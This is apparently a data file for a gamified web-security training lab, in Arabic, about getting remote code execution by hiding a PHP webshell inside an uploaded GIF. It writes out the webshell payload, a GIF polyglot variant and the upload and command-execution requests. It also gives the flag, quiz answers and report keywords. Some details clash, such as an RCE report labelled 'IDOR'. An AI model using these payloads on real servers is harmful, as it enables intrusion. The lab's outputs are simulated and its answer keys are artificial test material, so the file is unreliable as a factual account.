// ==========================================================
// SCENARIO 008: FILE UPLOAD TO RCE - IMAGEMAGICK GIF SHELL
// ==========================================================

window.scenario_008 = {
  "metadata": {
    "id": "scenario-008",
    "title": "File Upload to RCE - ImageMagick GIF Shell",
    "level": "Hard",
    "category": "API Security",
    "company": "Meta",
    "reward": "$8,000",
    "time": "3+ Hours"
  },
  "decisionLog": [
    {
      "hypothesis": "الخادم يمنع رفع ملفات الـ PHP كلياً عبر فحص امتداد الملف.",
      "whyFailed": "الخادم يمنع امتداد .php بالفعل لكنه يستخدم مكتبة ImageMagick الضعيفة لمعالجة صور GIF وتغيير حجمها.",
      "planB": "حقن كود PHP داخل هيكلية صور GIF في بايتات لا يتم تعديلها أثناء معالجة الصور.",
      "ignored": "محاولة فحص ثغرات XSS في حقل الاسم."
    }
  ],
  "payloads": [
    {
      "code": "<?php system($_GET[\"c\"]); ?>",
      "explanation": "كود PHP صغير (Webshell) لحقن الأوامر في النظام وتنفيذها عبر المعامل c.",
      "whyWorked": "الخادم ينفذ الملف بناءً على محتواه الفعلي وليس الامتداد، ومكتبة ImageMagick تركت الكود دون تعديل.",
      "alternatives": [
        "GIF89a; <?php phpinfo(); ?>",
        "EXIF metadata payload"
      ]
    }
  ],
  "mistakes": [
    {
      "mistake": "استخدام امتداد .php وتغيير الـ Content-Type فقط.",
      "whyWrong": "الخادم يطبق فحصاً صارماً للامتداد ويرفض الملفات التي لا تنتهي بـ .gif أو .jpg.",
      "betterWay": "استخدام امتداد .gif حقيقي وحقن الكود داخل البايتات غير المعدلة."
    }
  ],
  "steps": [
    {
      "name": "Mission Brief",
      "time": "09:00",
      "workspace": "markdown",
      "xpReward": 100,
      "description": "### 🎯 الهدف: تحقيق RCE عبر رفع الملفات ومكتبة ImageMagick\n\nمرحباً بك! منصة مشاركة صور اجتماعية تسمح للمستخدمين برفع صورهم الشخصية وتستخدم مكتبة ImageMagick لتعديل حجمها تلقائياً.\n\n#### قواعد الفحص:\n- مسار رفع الصور: `POST /api/upload-avatar`\n- يُقبل فقط الامتدادات: JPG, PNG, GIF.\n- ابحث عن طريقة لحقن كود تشغيل أوامر النظام (RCE) وتخطي الفلترة.\n\nاضغط على **Next Step** للبدء.",
      "aiAdvisor": {
        "hint": "فكر في كيفية بقاء البايتات سليمة داخل كود الـ GIF بعد المعالجة.",
        "payloadExplanation": "لا توجد أكواد حالياً.",
        "failureExplanation": "لا يوجد."
      }
    },
    {
      "name": "Passive Recon",
      "time": "09:15",
      "workspace": "recon",
      "xpReward": 150,
      "description": "### 🔍 إعداد ومقارنة ملف الـ GIF المحقون\n\nسنقوم بإنشاء صورة GIF ومقارنتها بعد الرفع لمعرفة البايتات التي لم تعدلها مكتبة ImageMagick.\nاختر الأداة المناسبة لتشغيلها.",
      "terminalCommands": [
        {
          "name": "convert -size 100x100 xc:black test.gif",
          "correct": true,
          "evidence": {
            "title": "Clean GIF Created",
            "content": "Image size: 100x100\nType: GIF\nUnused Bytes: Found empty byte sequence at offset 0x30"
          },
          "output": [
            {
              "text": "[INF] Creating solid black GIF image...",
              "type": "info"
            },
            {
              "text": "File test.gif created successfully.",
              "type": "success"
            },
            {
              "text": "[!] Success: Empty byte spaces identified in GIF format metadata!",
              "type": "success"
            }
          ]
        },
        {
          "name": "exiftool test.gif",
          "correct": false,
          "output": [
            {
              "text": "ExifTool Version Number: 12.40",
              "type": "info"
            },
            {
              "text": "File Type: GIF",
              "type": "out"
            }
          ]
        }
      ],
      "aiAdvisor": {
        "hint": "شغّل أمر convert لإنشاء صورة GIF تجريبية وفحص البايتات الفارغة بالملف.",
        "payloadExplanation": "الأمر convert من أدوات ImageMagick يقوم بإنشاء ملف صور نقي لاختبار مساحات الحقن.",
        "failureExplanation": "عدم إنشاء الملف يمنعك من معرفة الهيكلية الصحيحة للحقن."
      }
    },
    {
      "name": "Burp Verification",
      "time": "09:40",
      "workspace": "burp",
      "xpReward": 200,
      "description": "### 🌐 رفع الـ GIF المحقون بالـ PHP Webshell\n\nقمنا بحقن كود `<?php system($_GET[\"c\"]); ?>` في المساحات الفارغة من ملف الـ GIF.\nاضغط على **Upload & Execute command** لتأكيد إمكانية تشغيل أمر whoami على خادم الويب.",
      "burpRequest": "POST /api/upload-avatar HTTP/1.1\nHost: target-social.com\nContent-Type: multipart/form-data; boundary=----Boundary\n\n------Boundary\nContent-Disposition: form-data; name=\"file\"; filename=\"avatar.gif\"\nContent-Type: image/gif\n\nGIF89a...\n<?php system($_GET[\"c\"]); ?>\n------Boundary--",
      "burpResponse": "HTTP/1.1 200 OK\n{\n  \"status\": \"success\",\n  \"url\": \"https://cdn.target-social.com/avatars/user_1337.gif\"\n}",
      "burpActions": [
        {
          "name": "Upload & Execute command",
          "correct": true,
          "modifiedRequest": "GET /avatars/user_1337.gif?c=whoami HTTP/1.1\nHost: cdn.target-social.com\nUser-Agent: Mozilla/5.0",
          "modifiedResponse": "HTTP/1.1 200 OK\nContent-Type: text/html\n\nwww-data\n[Executed command whoami on server successfully!]",
          "evidence": {
            "title": "ImageMagick GIF RCE",
            "content": "GET /avatars/user_1337.gif?c=whoami -> Returns www-data shell output"
          }
        }
      ],
      "aiAdvisor": {
        "hint": "اضغط على زر Upload & Execute command لتشغيل الاستعلام وقراءة نتيجة shell.",
        "payloadExplanation": "طلب الصورة مع تمرير المعامل c لتشغيل أمر whoami على الخادم.",
        "failureExplanation": "تأكد من نجاح رفع وتشغيل الملف."
      }
    },
    {
      "name": "Exploitation & Flag",
      "time": "10:05",
      "workspace": "lab",
      "xpReward": 300,
      "instructions": "أدخل الـ Flag بعد تأكيد الحصول على RCE كامل وقراءة الخادم للـ Payload.",
      "targetUrl": "https://cdn.target-social.com/avatars/user_1337.gif?c=whoami",
      "correctFlag": "FLAG{imagemagick_gif_rce_whoami}",
      "aiAdvisor": {
        "hint": "أدخل العلم الصحيح: FLAG{imagemagick_gif_rce_whoami}",
        "payloadExplanation": "تأكيد إكمال عملية تشغيل الأوامر بالكامل.",
        "failureExplanation": "تأكد من كتابة الأحرف بطريقة صحيحة."
      }
    },
    {
      "name": "Report Writing",
      "time": "10:30",
      "workspace": "report",
      "xpReward": 250,
      "aiAdvisor": {
        "hint": "الكلمات المفتاحية المطلوبة هي 'imagemagick' و 'rce'.",
        "payloadExplanation": "شرح خطورة السماح للخادم بتنفيذ الأكواد المخفية داخل ملفات الصور المعالجة.",
        "failureExplanation": "تأكد من وجود الكلمات الدلالية في التقرير."
      }
    },
    {
      "name": "Triage & Verdict",
      "time": "2 Days Later",
      "workspace": "review",
      "aiAdvisor": {
        "hint": "تفحص قرار المشغل الأمني ومكافأة الفحص.",
        "payloadExplanation": "تم تقييمها كـ Critical لتنفيذ الأوامر عشوائياً RCE.",
        "failureExplanation": "لا يوجد."
      }
    },
    {
      "name": "Lessons Learned",
      "time": "Post-Incident",
      "workspace": "quiz",
      "quizData": [
        {
          "question": "كيف يتم تنفيذ الـ PHP Webshell رغم أن امتداد الملف هو .gif؟",
          "options": [
            "لأن الخادم لا يقرأ الامتداد.",
            "لأن بعض تكوينات خادم الويب (مثل Apache/Nginx) تقوم بتنفيذ وتمرير الملف للمفسر بناءً على محتواه الفعلي (MIME Type) وليس فقط الامتداد.",
            "بسبب استخدام جدار حماية.",
            "لأن الصور تحتوي على نصوص."
          ],
          "answer": 1
        },
        {
          "question": "كيف يمكن للمطور منع ثغرات الـ RCE عبر معالجة الصور؟",
          "options": [
            "تغيير حجم الصور يدوياً.",
            "تحديث مكتبة ImageMagick وحذف الأكواد المضمنة وإعادة كتابة بكسلات الصور بالكامل (Re-encoding) لمنع بقاء أي بايتات غير معدلة، وتكوين خادم الويب لعدم تشغيل ملفات الوسائط ككود برمجي.",
            "حظر استخدام الامتداد .gif.",
            "تعطيل رفع الصور."
          ],
          "answer": 1
        }
      ],
      "aiAdvisor": {
        "hint": "الإجابة لكلا السؤالين هي الخيار الثاني (ب).",
        "payloadExplanation": "التحقق من فهم معايير أمان معالجة الصور ورفع الملفات الحساسة.",
        "failureExplanation": "خطأ في الإجابة يؤدي لخصم XP."
      }
    }
  ],
  "realReport": {
    "title": "Remote Code Execution via embedded PHP code in processed GIF image using ImageMagick",
    "severity": "Critical",
    "type": "IDOR",
    "desc": "The avatar upload service processes uploaded GIF images using a vulnerable ImageMagick version. By placing PHP payload inside unmodified bytes in the GIF file, an attacker can execute OS commands when requesting the avatar URL since the webserver executes file content as PHP.",
    "steps": "1. Create a GIF file with embedded PHP system code.\n2. Upload it to /api/upload-avatar.\n3. Request the resulting URL with query command parameters: ?c=whoami.",
    "impact": "Complete server RCE compromise under www-data context.",
    "feedback": "Confirmed. We migrated from legacy CGI configurations and updated ImageMagick rules to scrub metadata and force proper mime execution. Bounty awarded.",
    "keywords": [
      "imagemagick",
      "rce"
    ]
  }
};
